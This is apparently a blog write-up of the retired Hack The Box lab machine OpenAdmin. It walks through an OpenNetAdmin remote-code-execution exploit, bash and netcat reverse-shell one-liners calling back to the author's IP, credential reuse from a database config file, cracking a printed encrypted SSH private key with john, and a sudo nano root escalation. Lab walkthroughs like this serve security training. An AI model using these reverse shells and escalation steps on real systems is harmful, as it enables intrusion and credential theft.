---
layout: post
title: "HTB: OpenAdmin"
tags: htb
---

OpenAdmin was ranked easy on HTB but _imo_ really should've been ranked medium. Anyway, sharing my notes on OpenAdmin since this box has been retired.

### Recce
Not much, if you do an nmap scan you'll see only ports 80 and 22.

### Port 80
Visiting port 80, you see a default Apache page.

If you dirbust, you'll likely see these first few results (wordlist: `/usr/share/wordlist/dirb/big.txt`)
```
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/artwork (Status: 301)
/music (Status: 301)
/server-status (Status: 403)
/sierra (Status: 301)
```

`/artwork` gives you nothing but some landing page for 'Arcwork'.  
`/music` gives you some landing page for a music company, but if you click the 'login' button at the top, you get redirected to _completely_ different-looking site at `/ona`.

Now at this point, `/ona` looks sufficiently interesting for 2 reasons:
1. It looks really different from its parent site at `/music` - in fact it's not even a sub-directory of `/music`, with the page located at `http://openadmin.htb/ona/`.
2. There's a version number that almost literally pops right out at you - version 18.1.1. Now if you've done enough OSCP / HTB, version numbers are always a good place to start.

### Shell as www-data
Googling `ona 18.1.1 exploit` should yield you [this first result](https://www.exploit-db.com/exploits/47691).

The exploit basically gives you a shell with no feedback (as in no stdout). You can verify whether it works by triggering a callback to your machine.

Example: running the exploit to point at `http://openadmin.htb/ona/` and running a nc callback `nc -nc <ur_ip> 4444` (Note: somehow you must add a `\` at the end or the URL for this to work)
```
kali@kali:~$ ./ona.sh http://openadmin.htb/ona/
$ nc -nv 10.10.14.64 4444
```
If you had a netcat listening at 4444, you'd get a callback.

Since we want a working shell, we can throw in a line to return a shell back, like this:
```
kali@kali:~$ ./ona.sh http://openadmin.htb/ona/
$ bash -c "bash -i >%26 /dev/tcp/10.10.14.64/4444 0>%261"
```
(Note: The '&' character had to be url-encoded to '%26')

If you had a netcat listening at 4444, you'd get a shell back:
```
kali@kali:~$ sudo nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.64] from (UNKNOWN) [10.10.10.171] 53584
bash: cannot set terminal process group (1003): Inappropriate ioctl for device                                                                   
bash: no job control in this shell                                                                                                               
www-data@openadmin:/opt/ona/www$   
```

### Priv: www-data -> jimmy
If you'd looked around, or run some enumeration scripts, likely you'd have found that there's not much you can do as `www-data`. So in this case, we can in fact take advantage of the fact that we're `www-data`, and look through the web-app config files for some useful information.

One of the best places to look first is always database configs for some credentials, and by searching around the webroot, you can find one at `/opt/ona/www/local/config/database_settings.inc.php`.
```
www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php
cat database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

At this point, I tried logging in to the database locally with `mysql -u ona_sys -p` and password `n1nj4W4rri0R!`. Managed to get in and snoop around, but found nothing useful.
```
mysql> select * from ona_default;
id      username        password        level   ctime   atime
1       guest   098f6bcd4621d373cade4e832627b4f6        0       2020-03-30 10:59:53     2020-03-30 10:59:53
2       admin   21232f297a57a5a743894a0e4a801fc3        0       2007-10-30 03:00:17     2007-12-02 22:10:26
```
If you cracked the `admin` hash, the password is 'admin', which if you try on SSH (with username `admin`), it fails. Also, if our reward for cracking the hash is `admin`, this very likely isn't the way to go. ¯\_(ツ)_/¯

One thing to do if you have passwords is always to try them on other users. To do that, first we gotta find out users with access to the box. One of the easiest ways is to see which users are listed in the `/home` directory.
```
www-data@openadmin:/opt/ona/www/local/config$ cd /home
cd /home
www-data@openadmin:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root   root   4096 Nov 22  2019 .
drwxr-xr-x 24 root   root   4096 Nov 21  2019 ..
drwxr-x---  5 jimmy  jimmy  4096 Nov 22  2019 jimmy
drwxr-x---  6 joanna joanna 4096 Nov 28 09:37 joanna
```

We've got `jimmy` and `joanna`. Let's try `jimmy` first:
```
kali@kali:~$ sshpass -p 'n1nj4W4rri0R!' ssh jimmy@openadmin.htb
```
```
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

(..snip..)

Last login: Thu May 28 07:38:30 2020 from 10.10.14.12
jimmy@openadmin:~$ 
```

That worked, and we got `jimmy`.

### Priv: jimmy -> joanna
At this point the standard thing to do is to run an enumeration script again, since results might be different if we have `jimmy`'s permissions. Speaking of which, let's take a look at `jimmy`'s permissions:
```
jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```

`jimmy` belongs to the `internal` group, and if you'd looked around the apache2 configs, you would've noticed a file at `/etc/apache2/sites-available/internal.conf` that was out of your reach when you were `www-data`:
```
jimmy@openadmin:/etc/apache2/sites-available$ cat internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

So there's a web server running at port `52846` that listens only on localhost. Let's check that out and confirm for ourselves:
```
jimmy@openadmin:/etc/apache2/sites-available$ netstat -ant | grep LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN 
```

Indeed we have a local web server at port `52846` - maybe we can interact with it locally for some special information. But before that, let's go over to `/var/www/internal` and check things out.
```
jimmy@openadmin:/var/www/internal$ ls -l
total 12
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```

Let's have a look inside `index.php`:
```
(..snip..)
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
(..snip..)
```

Inside `main.php`:
```
jimmy@openadmin:/var/www/internal$ cat main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Interesting - looks like if we authenticate to `index.php` with `jimmy`'s credentials, we get redirected to `main.php` which gives us `joanna`'s private SSH key!

From here, there are 2 ways to get `joanna` shell:

#### 1. Authenticate as `jimmy` locally and grab `joanna`'s SSH key.
```
jimmy@openadmin:/var/www/internal$ curl -u jimmy:n1nj4W4rri0R! 127.0.0.1:52846/main.php
```
```
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

If you tried to SSH to `joanna` with just the key, you'd be asked to provide a passphrase. To get the passphrase, you can crack `joanna`'s key with _john_.

First step: convert the key to john-crackable format: `python /usr/share/john/ssh2john.py joanna.key > joanna.key.hashes`  
Second step: _john_ the hash: `sudo john --format=SSH joanna.key.hashes`

You should get this result: `bloodninjas`

You should be now able to login successfully as `joanna` with the key and the passphrase:
```
kali@kali:~/htb/boxes/openadmin/ssh$ ssh -i joanna.key joanna@openadmin.htb
Enter passphrase for key 'joanna.key':                                                                                                           
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)                                                                               
                                                                                                                                                 
(..snip..)

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
joanna@openadmin:~$ 
```

#### 2. Edit `main.php` to give us `joanna` shell.

Remember we can edit `main.php` as `jimmy`:
```
jimmy@openadmin:/var/www/internal$ ls -l
total 12
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```

Let's swap out the `cat /home/joanna/.ssh/id_rsa` command in the `shell_exec` function with a reverse shell to our machine: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.64 5555 >/tmp/f`
```
jimmy@openadmin:/var/www/internal$ cat main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.64 5555 >/tmp/f');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Open a listener on your machine at port 5555, and curl as `jimmy` to `index.php`: `curl -u jimmy:n1nj4W4rri0R! 127.0.0.1:52846/main.php`

You should get a shell back as `joanna`:
```
kali@kali:~$ sudo nc -lvnp 5555
[sudo] password for kali: 
listening on [any] 5555 ...
connect to [10.10.14.64] from (UNKNOWN) [10.10.10.171] 35260
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
```

### Priv: joanna -> root
Turns out, `joanna` can `sudo`, albeit restrictively:
```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Luckily in such situations, there's a super awesome resource called [GTFOBins](https://gtfobins.github.io/) that tells you exactly what to do in this situation. (All thanks to IppSec for first introducing this resource).

Search GTFOBins for `nano` and click `sudo` (that's what we have - _sudo_ _nano_).

Follow the instructions (but adapt a little):
```
joanna@openadmin:~$ sudo /bin/nano /opt/priv
^R^X
reset; sh 1>&0 2>&0
```
Note: ^ -> ctrl. 

Once you hit `^R^X` and entered the string `reset; sh 1>&0 2>&0`, you should see a `#` appear at the end of the line. From there if you type `id`, you should see that you're root.
```
Command to execute: reset; sh 1>&0 2>&0# id                                                                                                        
uid=0(root) gid=0(root) groups=0(root)
```

:)

### Enumeration that turned out to be useless:
Remember when we saw that `/var/www/internal/index.php` contained a hard-coded form of authentication? Which absolutely tied in with why we didn't find anything juicy earlier in the mysql database? 

If we cracked it, e.g. by throwing it into [crackstation](https://crackstation.net), you get this result:
Hash | Type | Result
--- | --- | ---
00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758e<br>ebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1 | sha512 | Revealed

...which turns out to not be something we can use. (Or had to use, anyway).

